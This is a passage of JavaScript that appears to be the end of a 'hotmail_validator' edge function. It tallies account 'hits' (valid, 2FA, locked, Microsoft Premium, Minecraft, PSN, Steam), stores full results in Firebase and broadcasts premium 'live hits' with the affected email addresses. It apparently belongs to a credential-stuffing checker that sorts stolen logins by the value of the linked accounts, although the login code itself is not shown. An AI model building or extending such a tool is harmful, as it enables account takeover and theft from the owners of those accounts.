    console.log(`${getCanaryTimestamp()} Invalid: ${stats.invalid}`);
    console.log(`${getCanaryTimestamp()} 2FA: ${stats.twoFa}`);
    console.log(`${getCanaryTimestamp()} Locked: ${stats.locked}`);
    console.log(`${getCanaryTimestamp()} MS Premium: ${stats.msPremium}`);
    console.log(`${getCanaryTimestamp()} Minecraft: ${stats.minecraftHits}`);
    console.log(`${getCanaryTimestamp()} PSN: ${stats.psnHits}`);
    console.log(`${getCanaryTimestamp()} Steam: ${stats.steamHits}`);
    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);

    // Save history to Firebase if user is authenticated
    if (userId && saveHistory) {
      EdgeRuntime.waitUntil(firebasePush(`users/${userId}/checkHistory`, {
        service: "hotmail_validator",
        checkMode,
        inputCount: accounts.length,
        stats,
        sessionInfo,
        results: allResults,
        createdAt: new Date().toISOString()
      }));

      // Push live hits for valid accounts with premium features
      const premiumHits = allResults.filter(r => 
        r.status === 'valid' && (r.msStatus === 'PREMIUM' || r.psn?.status === 'HAS_ORDERS' || r.steam?.status === 'HAS_PURCHASES' || r.minecraft?.status === 'OWNED')
      );
      
      for (const hit of premiumHits.slice(0, 10)) {
        EdgeRuntime.waitUntil(firebasePush('liveHits', {
          service: 'hotmail_validator',
          username: userEmail || 'anonymous',
          hitData: {
            email: hit.email,
            msStatus: hit.msStatus,
            psn: hit.psn?.orders,
            steam: hit.steam?.count,
            minecraft: hit.minecraft?.username,
          },
          createdAt: Date.now()
        }));
      }
    }

    return new Response(
      JSON.stringify({ results: allResults, stats, sessionInfo }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} ERROR:`, error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
